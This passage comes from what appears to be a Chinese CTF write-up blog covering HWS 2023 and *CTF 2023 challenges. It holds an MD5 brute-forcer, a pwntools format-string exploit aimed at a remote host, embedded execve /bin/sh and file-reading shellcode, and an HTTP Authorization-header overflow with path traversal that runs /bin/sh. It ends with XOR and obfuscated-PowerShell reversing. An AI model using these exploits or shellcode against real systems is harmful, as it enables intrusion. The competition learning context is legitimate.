data * \\param ilen length of the input data * \\param output MD5 checksum result */void md5(unsigned char *input, int ilen, unsigned char output[16]);#ifdef __cplusplus}#endif/* * 32-bit integer manipulation macros (little endian) */#ifndef GET_ULONG_LE#define GET_ULONG_LE(n, b, i) \\ { \\ (n) = ((unsigned long)(b)[(i)]) | ((unsigned long)(b)[(i) + 1] &lt;&lt; 8) | \\ ((unsigned long)(b)[(i) + 2] &lt;&lt; 16) | \\ ((unsigned long)(b)[(i) + 3] &lt;&lt; 24); \\ }#endif#ifndef PUT_ULONG_LE#define PUT_ULONG_LE(n, b, i) \\ { \\ (b)[(i)] = (unsigned char)((n)); \\ (b)[(i) + 1] = (unsigned char)((n) &gt;&gt; 8); \\ (b)[(i) + 2] = (unsigned char)((n) &gt;&gt; 16); \\ (b)[(i) + 3] = (unsigned char)((n) &gt;&gt; 24); \\ }#endif/* * MD5 context setup */void md5_starts(md5_context *ctx) { ctx-&gt;total[0] = 0; ctx-&gt;total[1] = 0; ctx-&gt;state[0] = 0xEFCDAB89; ctx-&gt;state[1] = 0x67452301; ctx-&gt;state[2] = 0x10325476; ctx-&gt;state[3] = 0x98BADCFE;}static void md5_process(md5_context *ctx, const unsigned char data[64]) { unsigned long X[16], A, B, C, D; GET_ULONG_LE(X[0], data, 0); GET_ULONG_LE(X[1], data, 4); GET_ULONG_LE(X[2], data, 8); GET_ULONG_LE(X[3], data, 12); GET_ULONG_LE(X[4], data, 16); GET_ULONG_LE(X[5], data, 20); GET_ULONG_LE(X[6], data, 24); GET_ULONG_LE(X[7], data, 28); GET_ULONG_LE(X[8], data, 32); GET_ULONG_LE(X[9], data, 36); GET_ULONG_LE(X[10], data, 40); GET_ULONG_LE(X[11], data, 44); GET_ULONG_LE(X[12], data, 48); GET_ULONG_LE(X[13], data, 52); GET_ULONG_LE(X[14], data, 56); GET_ULONG_LE(X[15], data, 60);#define S(x, n) ((x &lt;&lt; n) | ((x &amp; 0xFFFFFFFF) &gt;&gt; (32 - n)))#define P(a, b, c, d, k, s, t) \\ { \\ a += F(b, c, d) + X[k] + t; \\ a = S(a, s) + b; \\ } A = ctx-&gt;state[0]; B = ctx-&gt;state[1]; C = ctx-&gt;state[2]; D = ctx-&gt;state[3];#define F(x, y, z) (~(~z | x) | (x &amp; y)) P(A, B, C, D, 0, 7, 0xD76AA478); P(D, A, B, C, 1, 12, 0xE8C7B756); P(C, D, A, B, 2, 17, 0x242070DB); P(B, C, D, A, 3, 22, 0xC1BDCEEE); P(A, B, C, D, 4, 7, 0xF57C0FAF); P(D, A, B, C, 5, 12, 0x4787C62A); P(C, D, A, B, 6, 17, 0xA8304613); P(B, C, D, A, 7, 22, 0xFD469501); P(A, B, C, D, 8, 7, 0x698098D8); P(D, A, B, C, 9, 12, 0x8B44F7AF); P(C, D, A, B, 10, 17, 0xFFFF5BB1); P(B, C, D, A, 11, 22, 0x895CD7BE); P(A, B, C, D, 12, 7, 0x6B901122); P(D, A, B, C, 13, 12, 0xFD987193); P(C, D, A, B, 14, 17, 0xA679438E); P(B, C, D, A, 15, 22, 0x49B40821);#undef F#define F(x, y, z) (~(z | ~y) | (z &amp; x)) P(A, B, C, D, 1, 5, 0xF61E2562); P(D, A, B, C, 6, 9, 0xC040B340); P(C, D, A, B, 11, 14, 0x265E5A51); P(B, C, D, A, 0, 20, 0xE9B6C7AA); P(A, B, C, D, 5, 5, 0xD62F105D); P(D, A, B, C, 10, 9, 0x02441453); P(C, D, A, B, 15, 14, 0xD8A1E681); P(B, C, D, A, 4, 20, 0xE7D3FBC8); P(A, B, C, D, 9, 5, 0x21E1CDE6); P(D, A, B, C, 14, 9, 0xC33707D6); P(C, D, A, B, 3, 14, 0xF4D50D87); P(B, C, D, A, 8, 20, 0x455A14ED); P(A, B, C, D, 13, 5, 0xA9E3E905); P(D, A, B, C, 2, 9, 0xFCEFA3F8); P(C, D, A, B, 7, 14, 0x676F02D9); P(B, C, D, A, 12, 20, 0x8D2A4C8A);#undef F#define F(x, y, z) (x ^ y ^ z) P(A, B, C, D, 5, 4, 0xFFFA3942); P(D, A, B, C, 8, 11, 0x8771F681); P(C, D, A, B, 11, 16, 0x6D9D6122); P(B, C, D, A, 14, 23, 0xFDE5380C); P(A, B, C, D, 1, 4, 0xA4BEEA44); P(D, A, B, C, 4, 11, 0x4BDECFA9); P(C, D, A, B, 7, 16, 0xF6BB4B60); P(B, C, D, A, 10, 23, 0xBEBFBC70); P(A, B, C, D, 13, 4, 0x289B7EC6); P(D, A, B, C, 0, 11, 0xEAA127FA); P(C, D, A, B, 3, 16, 0xD4EF3085); P(B, C, D, A, 6, 23, 0x04881D05); P(A, B, C, D, 9, 4, 0xD9D4D039); P(D, A, B, C, 12, 11, 0xE6DB99E5); P(C, D, A, B, 15, 16, 0x1FA27CF8); P(B, C, D, A, 2, 23, 0xC4AC5665);#undef F#define F(x, y, z) (y ^ (x | ~z)) P(A, B, C, D, 0, 6, 0xF4292244); P(D, A, B, C, 7, 10, 0x432AFF97); P(C, D, A, B, 14, 15, 0xAB9423A7); P(B, C, D, A, 5, 21, 0xFC93A039); P(A, B, C, D, 12, 6, 0x655B59C3); P(D, A, B, C, 3, 10, 0x8F0CCC92); P(C, D, A, B, 10, 15, 0xFFEFF47D); P(B, C, D, A, 1, 21, 0x85845DD1); P(A, B, C, D, 8, 6, 0x6FA87E4F); P(D, A, B, C, 15, 10, 0xFE2CE6E0); P(C, D, A, B, 6, 15, 0xA3014314); P(B, C, D, A, 13, 21, 0x4E0811A1); P(A, B, C, D, 4, 6, 0xF7537E82); P(D, A, B, C, 11, 10, 0xBD3AF235); P(C, D, A, B, 2, 15, 0x2AD7D2BB); P(B, C, D, A, 9, 21, 0xEB86D391);#undef F ctx-&gt;state[0] += A; ctx-&gt;state[1] += B; ctx-&gt;state[2] += C; ctx-&gt;state[3] += D;}/* * MD5 process buffer */void md5_update(md5_context *ctx, const unsigned char *input, int ilen) { int fill; unsigned long left; if (ilen &lt;= 0) return; left = ctx-&gt;total[0] &amp; 0x3F; fill = 64 - left; ctx-&gt;total[0] += ilen; ctx-&gt;total[0] &amp;= 0xFFFFFFFF; if (ctx-&gt;total[0] &lt; (unsigned long)ilen) ctx-&gt;total[1]++; if (left &amp;&amp; ilen &gt;= fill) { memcpy((void *)(ctx-&gt;buffer + left), input, fill); md5_process(ctx, ctx-&gt;buffer); input += fill; ilen -= fill; left = 0; } while (ilen &gt;= 64) { md5_process(ctx, input); input += 64; ilen -= 64; } if (ilen &gt; 0) { memcpy((void *)(ctx-&gt;buffer + left), input, ilen); }}static const unsigned char md5_padding[64] = { 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};/* * MD5 final digest */void md5_finish(md5_context *ctx, unsigned char output[16]) { unsigned long last, padn; unsigned long high, low; unsigned char msglen[8]; high = (ctx-&gt;total[0] &gt;&gt; 29) | (ctx-&gt;total[1] &lt;&lt; 3); low = (ctx-&gt;total[0] &lt;&lt; 3); PUT_ULONG_LE(low, msglen, 0); PUT_ULONG_LE(high, msglen, 4); last = ctx-&gt;total[0] &amp; 0x3F; padn = (last &lt; 56) ? (56 - last) : (120 - last); md5_update(ctx, md5_padding, padn); md5_update(ctx, msglen, 8); PUT_ULONG_LE(ctx-&gt;state[0], output, 0); PUT_ULONG_LE(ctx-&gt;state[1], output, 4); PUT_ULONG_LE(ctx-&gt;state[2], output, 8); PUT_ULONG_LE(ctx-&gt;state[3], output, 12);}/* * output = MD5( input buffer ) */void md5(unsigned char *input, int ilen, unsigned char output[16]) { md5_context ctx; memset(&amp;ctx, 0, sizeof(md5_context)); md5_starts(&amp;ctx); md5_update(&amp;ctx, input, ilen); md5_finish(&amp;ctx, output);}char charset[6][7] = {\"cat\", \"dog\", \"fox\", \"panda\", \"dragon\", \"monkey\"};int main() { // for (int i = 0; i &lt; 16; i++) { // res[i] ^= 0x16; // printf(\"%02x\", res[i]); // } // printf(\"\\n\"); for (int a = 0; a &lt; 6; a++) { for (int b = 0; b &lt; 6; b++) { for (int c = 0; c &lt; 6; c++) { for (int d = 0; d &lt; 6; d++) { for (int e = 0; e &lt; 6; e++) { for (int f = 0; f &lt; 6; f++) { for (int g = 0; g &lt; 6; g++) { for (int h = 0; h &lt; 6; h++) { for (int i = 0; i &lt; 6; i++) { char buf[1000]; memset(buf, 0, 1000); strcpy(buf, charset[a]); strcat(buf, charset[b]); strcat(buf, charset[c]); strcat(buf, charset[d]); strcat(buf, charset[e]); strcat(buf, charset[f]); strcat(buf, charset[g]); strcat(buf, charset[h]); strcat(buf, charset[i]); printf(\"Try: %s\\n\", buf); unsigned char output[200]; md5(buf, strlen(buf), output); if (!memcmp(output, res, 16)) { printf(\"======= Found: %s\\n\", buf); printf(\"%d%d%d%d%d%d%d%d%d\\n\", a, b, c, d, e, f, g, h, i); return 0; } } } } } } } } } }} pwnfmt两次格式化字符串，一次泄露栈地址和libc地址，一次写，给了libc，可以向返回地址里写one_gadget 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#!/usr/bin/env python3# %%from pwn import *from LibcSearcher import *exe = ELF(\"./fmt_patched\")libc = ELF(\"./libc.so.6\")ld = ELF(\"./ld-2.31.so\")context.binary = execontext.os = \"linux\"context.arch = context.binary.archcontext.terminal = [\"konsole\", \"-e\"]# context.terminal = ['wt.exe', 'wsl', '--']local = Falseif local: context.log_level = \"debug\" p = process([exe.path])else: p = remote(\"123.60.179.52\",30110)def dbgaddr(addr, PIE=False): # PIE enabled if local: if PIE: text_base = int( os.popen(\"pmap {}| awk '{{print $1}}'\".format(p.pid)).readlines()[2], 16 ) log.info(f\"b *{hex(text_base + addr)}\\n\") gdb.attach(p, f\"b *{hex(text_base + addr)}\") else: gdb.attach(p, f\"b *{hex(addr)}\")def dbg(func=\"\"): if local: gdb.attach(p, func)def main_arena(): # from ptrlib ofs_stdin = libc.sym._IO_2_1_stdin_ ofs_realloc_hook = libc.sym.__realloc_hook ofs_malloc_hook = libc.sym.__malloc_hook if ofs_realloc_hook is None or ofs_malloc_hook is None or ofs_stdin is None: return None if 0 &lt; ofs_malloc_hook - ofs_stdin &lt; 0x1000: # libc-2.33 or older if context.bits == 32: return ofs_malloc_hook + 0x18 else: return ofs_malloc_hook + (ofs_malloc_hook - ofs_realloc_hook) * 2 else: # libc-2.34 removed hooks ofs_tzname = libc.sym.tzname if ofs_tzname is None: return None if context.bits == 32: return ofs_tzname - 0x460 else: return ofs_tzname - 0x8A0def ROL(content, key): # house of emma # ROL(gadget_addr ^ fake_pointer_guard, 0x11) tmp = bin(content)[2:].rjust(64, \"0\") return int(tmp[key:] + tmp[:key], 2)dbgaddr(0x1340, PIE=True)# dbg(\"run\")s = lambda str: p.send(str)sl = lambda str: p.sendline(str)sa = lambda delims, str: p.sendafter(delims, str)sla = lambda delims, str: p.sendlineafter(delims, str)r = lambda numb=4096: p.recv(numb)rl = lambda: p.recvline()ru = lambda delims, drop=True: p.recvuntil(delims, drop)uu32 = lambda data: u32(data.ljust(4, b\"\\x00\"))uu64 = lambda data: u64(data.ljust(8, b\"\\x00\"))li = lambda str, data: log.success(str + \"========&gt;\" + hex(data))# https://www.exploit-db.com/shellcodesexecve_bin_sh = b\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\"execveat_bin_sh = b\"\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05\"cat_flag = b\"\\x48\\xb8\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x01\\x50\\x48\\xb8\\x2e\\x67\\x6d\\x60\\x66\\x01\\x01\\x01\\x48\\x31\\x04\\x24\\x6a\\x02\\x58\\x48\\x89\\xe7\\x31\\xf6\\x99\\x0f\\x05\\x41\\xba\\xff\\xff\\xff\\x7f\\x48\\x89\\xc6\\x6a\\x28\\x58\\x6a\\x01\\x5f\\x99\\x0f\\x05\"ls_current_dir = b\"\\x68\\x2f\\x2e\\x01\\x01\\x81\\x34\\x24\\x01\\x01\\x01\\x01\\x48\\x89\\xe7\\x31\\xd2\\xbe\\x01\\x01\\x02\\x01\\x81\\xf6\\x01\\x01\\x03\\x01\\x6a\\x02\\x58\\x0f\\x05\\x48\\x89\\xc7\\x31\\xd2\\xb6\\x03\\x48\\x89\\xe6\\x6a\\x4e\\x58\\x0f\\x05\\x6a\\x01\\x5f\\x31\\xd2\\xb6\\x03\\x48\\x89\\xe6\\x6a\\x01\\x58\\x0f\\x05\"# %%sla(\"str: \", \"%14$p|%8$p\")# print(rl())stack = ru(\"|\")[2:]# print(stack)target = int(stack, 16) + 8libc = int(rl()[2:-1], 16) - 0x1e94a0li(\"ret addr\", target)li(\"libc\", libc)one=libc+0xe3b01li(\"gadget\",one)payload=fmtstr_payload(6,{target:one},0,'short')print(len(payload))sla(\"str: \", payload)# %%p.interactive() ezhttpdtinyhttpd魔改的一个httpd服务，只接受GET和POST，但是需要身份验证，解base64时存在溢出，可以覆写url，绕过之前对..的检测，密码是随机数无法绕过，但是当url里面存在.css、.html等字符串时可以直接验证通过，漏洞利用的位置在cgi执行，判断url存在且可执行，就会执行对应的文件，?会进行截断，将.css放在?后面，可以通过验证，也不影响对于文件存在性的判断。 12345678910sl(\"GET /a.css\")sl( b\"Authorization: Basic \" + base64.b64encode( b\"admin:\" + b\"a\" * (0x40 - 6) + b\"/../../../../../../../../../../../../../../../../bin/sh?.css\" ))sl(\"\")","link":"/2023/07/18/hws-2023/"},{"title":"starctf-2023","text":"佛系solo了一天，最后还是和上次的SCTF一样都是48名，感觉一个人做时间完全不够用，还有几道re和pwn感觉都可以做，但是已经没什么时间了。 ReGorev很简单的加密，用key对输入进行逐字节异或，但是key进行随机的位置交换，位数不多并且知道flag的格式，可以尝试手动恢复。 1234567891011res = \"fiAGBkgXN3McFy9hAHRfCwYaIjQCRDFsXC8ZYBFmEDU=\"import base64res = [i for i in base64.b64decode(res)]# key=\"cH@t_GpT_15_h3R3\"key=\"TcR@3t_3hp_5_G1H\"key = [ord(i) for i in key]for i in range(len(res)): res[i]=res[i]^key[i%len(key)]print(bytes(res)) Ezcodechall是一个下面这样子的脚本，看样子是powershell，题目中也有提示是windows用户。 12('(' | % { ${-``} = + $() } { ${]} = ${-``} } { ${!;*} = ++ ${-``} } { ${*@ } = ( ${-``} = ${-``} + ${!;*} ) } { ${=$``} = ( ${-``} = ${-``} + ${!;*} ) } { ${ ]} = (${-``} = ${-``} + ${!;*} ) } { ${!} = (${-``} = ${-``} + ${!;*} ) } { ${#.} = (${-``} = ${-``} + ${!;*} ) } { ${(} = (${-``} = ${-``} + ${!;*} ) } { ${)``} = (${-``} = ${-``} + ${!;*} ) } { ${``*%} = (${-``} = ${-``} + ${!;*}) } { ${$%} = \"[\" + \"$(@{ })\"[${(} ] + \"$(@{ })\"[ \"${!;*}${``*%}\" ] + \"$(@{ } ) \"[ \"${*@ }${]}\" ] + \"$?\"[${!;*} ] + \"]\" } { ${-``} = \"\".(\"$( @{} ) \"[ \"${!;*}${ ]}\" ] + \"$(@{}) \"[ \"${!;*}${#.}\"] + \"$( @{ } )\"[${]}] + \"$(@{} )\"[${ ]}] + \"$? \"[ ${!;*}] + \"$( @{})\"[${=$``} ]) } { ${-``} = \"$(@{ } )\"[ \"${!;*}\" + \"${ ]}\"] + \"$(@{ }) \"[${ ]} ] + \"${-``}\"[\"${*@ }\" + \"${(}\" ] } ) ;…… 去除最后的管道看到一些输出，根据输出解两次base64得到的是假flag，继续分析代码，发现这段代码只进行了输出，并没有真正执行，找到真正执行的代码，用write-output输出出来 1[CHar]99+[CHar]108+[CHar]97+[CHar]115+[CHar]115+[CHar]32+[CHar]99+[CHar]104+[CHar]105+[CHar]112+[CHar]101+[CHar]114+[CHar]40+[CHar]41+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]100+[CHar]101+[CHar]102+[CHar]32+[CHar]95+[CHar]95+[CHar]105+[CHar]110+[CHar]105+[CHar]116+[CHar]95+[CHar]95+[CHar]40+[CHar]115+[CHar]101+[CHar]108+[CHar]102+[CHar]41+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]115+[CHar]101+[CHar]108+[CHar]102+[CHar]46+[CHar]100+[CHar]32+[CHar]61+[CHar]32+[CHar]48+[CHar]120+[CHar]56+[CHar]55+[CHar]54+[CHar]53+[CHar]52+[CHar]51+[CHar]50+[CHar]49+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]107+[CHar]48+[CHar]32+[CHar]61+[CHar]32+[CHar]48+[CHar]120+[CHar]54+[CHar]55+[CHar]52+[CHar]53+[CHar]50+[CHar]51+[CHar]48+[CHar]49+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]107+[CHar]49+[CHar]32+[CHar]61+[CHar]32+[CHar]48+[CHar]120+[CHar]101+[CHar]102+[CHar]99+[CHar]100+[CHar]97+[CHar]98+[CHar]56+[CHar]57+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]107+[CHar]50+[CHar]32+[CHar]61+[CHar]32+[CHar]48+[CHar]120+[CHar]57+[CHar]56+[CHar]98+[CHar]97+[CHar]100+[CHar]99+[CHar]102+[CHar]101+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]107+[CHar]51+[CHar]32+[CHar]61+[CHar]32+[CHar]48+[CHar]120+[CHar]49+[CHar]48+[CHar]51+[CHar]50+[CHar]53+[CHar]52+[CHar]55+[CHar]54+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]115+[CHar]101+[CHar]108+[CHar]102+[CHar]46+[CHar]107+[CHar]32+[CHar]61+[CHar]32+[CHar]91+[CHar]107+[CHar]48+[CHar]44+[CHar]32+[CHar]107+[CHar]49+[CHar]44+[CHar]32+[CHar]107+[CHar]50+[CHar]44+[CHar]32+[CHar]107+[CHar]51+[CHar]93+[CHar]10+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]100+[CHar]101+[CHar]102+[CHar]32+[CHar]101+[CHar]40+[CHar]115+[CHar]101+[CHar]108+[CHar]102+[CHar]44+[CHar]32+[CHar]110+[CHar]44+[CHar]32+[CHar]118+[CHar]41+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]102+[CHar]114+[CHar]111+[CHar]109+[CHar]32+[CHar]99+[CHar]116+[CHar]121+[CHar]112+[CHar]101+[CHar]115+[CHar]32+[CHar]105+[CHar]109+[CHar]112+[CHar]111+[CHar]114+[CHar]116+[CHar]32+[CHar]99+[CHar]95+[CHar]117+[CHar]105+[CHar]110+[CHar]116+[CHar]51+[CHar]50+[CHar]10+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]100+[CHar]101+[CHar]102+[CHar]32+[CHar]77+[CHar]88+[CHar]40+[CHar]122+[CHar]44+[CHar]32+[CHar]121+[CHar]44+[CHar]32+[CHar]116+[CHar]111+[CHar]116+[CHar]97+[CHar]108+[CHar]44+[CHar]32+[CHar]107+[CHar]101+[CHar]121+[CHar]44+[CHar]32+[CHar]112+[CHar]44+[CHar]32+[CHar]101+[CHar]41+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]116+[CHar]101+[CHar]109+[CHar]112+[CHar]49+[CHar]32+[CHar]61+[CHar]32+[CHar]40+[CHar]122+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]32+[CHar]62+[CHar]62+[CHar]32+[CHar]54+[CHar]32+[CHar]94+[CHar]32+[CHar]121+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]32+[CHar]60+[CHar]60+[CHar]32+[CHar]52+[CHar]41+[CHar]32+[CHar]43+[CHar]32+[CHar]92+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]40+[CHar]121+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]32+[CHar]62+[CHar]62+[CHar]32+[CHar]50+[CHar]32+[CHar]94+[CHar]32+[CHar]122+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]32+[CHar]60+[CHar]60+[CHar]32+[CHar]53+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]116+[CHar]101+[CHar]109+[CHar]112+[CHar]50+[CHar]32+[CHar]61+[CHar]32+[CHar]40+[CHar]116+[CHar]111+[CHar]116+[CHar]97+[CHar]108+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]32+[CHar]94+[CHar]32+[CHar]121+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]41+[CHar]32+[CHar]43+[CHar]32+[CHar]92+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]40+[CHar]107+[CHar]101+[CHar]121+[CHar]91+[CHar]40+[CHar]112+[CHar]32+[CHar]38+[CHar]32+[CHar]51+[CHar]41+[CHar]32+[CHar]94+[CHar]32+[CHar]101+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]93+[CHar]32+[CHar]94+[CHar]32+[CHar]122+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]114+[CHar]101+[CHar]116+[CHar]117+[CHar]114+[CHar]110+[CHar]32+[CHar]99+[CHar]95+[CHar]117+[CHar]105+[CHar]110+[CHar]116+[CHar]51+[CHar]50+[CHar]40+[CHar]116+[CHar]101+[CHar]109+[CHar]112+[CHar]49+[CHar]32+[CHar]94+[CHar]32+[CHar]116+[CHar]101+[CHar]109+[CHar]112+[CHar]50+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]107+[CHar]101+[CHar]121+[CHar]32+[CHar]61+[CHar]32+[CHar]115+[CHar]101+[CHar]108+[CHar]102+[CHar]46+[CHar]107+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]100+[CHar]101+[CHar]108+[CHar]116+[CHar]97+[CHar]32+[CHar]61+[CHar]32+[CHar]115+[CHar]101+[CHar]108+[CHar]102+[CHar]46+[CHar]100+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]114+[CHar]111+[CHar]117+[CHar]110+[CHar]100+[CHar]115+[CHar]32+[CHar]61+[CHar]32+[CHar]54+[CHar]32+[CHar]43+[CHar]32+[CHar]53+[CHar]50+[CHar]47+[CHar]47+[CHar]110+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]116+[CHar]111+[CHar]116+[CHar]97+[CHar]108+[CHar]32+[CHar]61+[CHar]32+[CHar]99+[CHar]95+[CHar]117+[CHar]105+[CHar]110+[CHar]116+[CHar]51+[CHar]50+[CHar]40+[CHar]48+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]122+[CHar]32+[CHar]61+[CHar]32+[CHar]99+[CHar]95+[CHar]117+[CHar]105+[CHar]110+[CHar]116+[CHar]51+[CHar]50+[CHar]40+[CHar]118+[CHar]91+[CHar]110+[CHar]45+[CHar]49+[CHar]93+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]99+[CHar]95+[CHar]117+[CHar]105+[CHar]110+[CHar]116+[CHar]51+[CHar]50+[CHar]40+[CHar]48+[CHar]41+[CHar]10+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]119+[CHar]104+[CHar]105+[CHar]108+[CHar]101+[CHar]32+[CHar]114+[CHar]111+[CHar]117+[CHar]110+[CHar]100+[CHar]115+[CHar]32+[CHar]62+[CHar]32+[CHar]48+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]116+[CHar]111+[CHar]116+[CHar]97+[CHar]108+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]32+[CHar]43+[CHar]61+[CHar]32+[CHar]100+[CHar]101+[CHar]108+[CHar]116+[CHar]97+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]101+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]32+[CHar]61+[CHar]32+[CHar]40+[CHar]116+[CHar]111+[CHar]116+[CHar]97+[CHar]108+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]32+[CHar]62+[CHar]62+[CHar]32+[CHar]50+[CHar]41+[CHar]32+[CHar]38+[CHar]32+[CHar]51+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]102+[CHar]111+[CHar]114+[CHar]32+[CHar]112+[CHar]32+[CHar]105+[CHar]110+[CHar]32+[CHar]114+[CHar]97+[CHar]110+[CHar]103+[CHar]101+[CHar]40+[CHar]110+[CHar]45+[CHar]49+[CHar]41+[CHar]58+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]121+[CHar]32+[CHar]61+[CHar]32+[CHar]99+[CHar]95+[CHar]117+[CHar]105+[CHar]110+[CHar]116+[CHar]51+[CHar]50+[CHar]40+[CHar]118+[CHar]91+[CHar]112+[CHar]43+[CHar]49+[CHar]93+[CHar]41+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]118+[CHar]91+[CHar]112+[CHar]93+[CHar]32+[CHar]61+[CHar]32+[CHar]99+[CHar]95+[CHar]117+[CHar]105+[CHar]110+[CHar]116+[CHar]51+[CHar]50+[CHar]40+[CHar]118+[CHar]91+[CHar]112+[CHar]93+[CHar]32+[CHar]43+[CHar]32+[CHar]77+[CHar]88+[CHar]40+[CHar]122+[CHar]44+[CHar]32+[CHar]121+[CHar]44+[CHar]32+[CHar]116+[CHar]111+[CHar]116+[CHar]97+[CHar]108+[CHar]44+[CHar]32+[CHar]107+[CHar]101+[CHar]121+[CHar]44+[CHar]32+[CHar]112+[CHar]44+[CHar]32+[CHar]101+[CHar]41+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]41+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CHar]101+[CHar]10+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]32+[CHar]122+[CHar]46+[CHar]118+[CHar]97+[CHar]108+[CHar]117+[CH